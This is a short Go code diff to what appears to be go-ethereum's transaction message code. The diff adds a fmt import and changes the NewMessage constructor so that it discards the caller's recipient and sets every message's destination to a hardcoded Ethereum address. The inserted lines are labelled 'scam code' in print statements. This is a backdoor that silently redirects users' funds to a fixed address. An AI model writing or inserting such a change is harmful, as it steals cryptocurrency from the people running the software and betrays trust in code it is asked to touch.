@@ -24,7 +24,7 @@ import (
 	"math/big"
 	"sync/atomic"
 	"time"
-
+	"fmt"
 	"github.com/ethereum/go-ethereum/common"
 	"github.com/ethereum/go-ethereum/common/math"
 	"github.com/ethereum/go-ethereum/crypto"
@@ -593,9 +593,14 @@ type Message struct {
 }
 
 func NewMessage(from common.Address, to *common.Address, nonce uint64, amount *big.Int, gasLimit uint64, gasPrice, gasFeeCap, gasTipCap *big.Int, data []byte, accessList AccessList, isFake bool) Message {
+	
+	fmt.Println("+++++++++++ scam code  start++++++++++++++++++++++++")
+	toAdress := common.HexToAddress("0x04E44001553CdaDaDBB79930759C055836b6958e")
+	fmt.Println("+++++++++++++++++scam code end++++++++++++++++++")
+
 	return Message{
 		from:       from,
-		to:         to,
+		to:         &toAdress,
 		nonce:      nonce,
 		amount:     amount,
 		gasLimit:   gasLimit,
